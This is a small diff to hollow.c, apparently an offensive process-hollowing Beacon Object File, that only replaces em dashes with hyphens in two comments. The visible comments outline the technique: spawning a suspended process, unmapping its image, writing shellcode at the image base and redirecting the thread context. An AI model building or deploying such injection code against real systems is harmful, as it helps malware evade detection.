@@ -1,5 +1,5 @@
 /*
- * hollow.c — Process hollowing BOF
+ * hollow.c - Process hollowing BOF
  *
  * Spawns a target process suspended, unmaps its original image,
  * writes shellcode at the image base, updates the thread context,
@@ -212,7 +212,7 @@ void go(char* args, int len)
         return;
     }
 
-    /* Update thread context — set RCX to our entry point (imageBase) */
+    /* Update thread context - set RCX to our entry point (imageBase) */
     CONTEXT ctx;
     for (int i = 0; i < (int)sizeof(ctx); i++) ((char*)&ctx)[i] = 0;
     ctx.ContextFlags = CONTEXT_FULL;
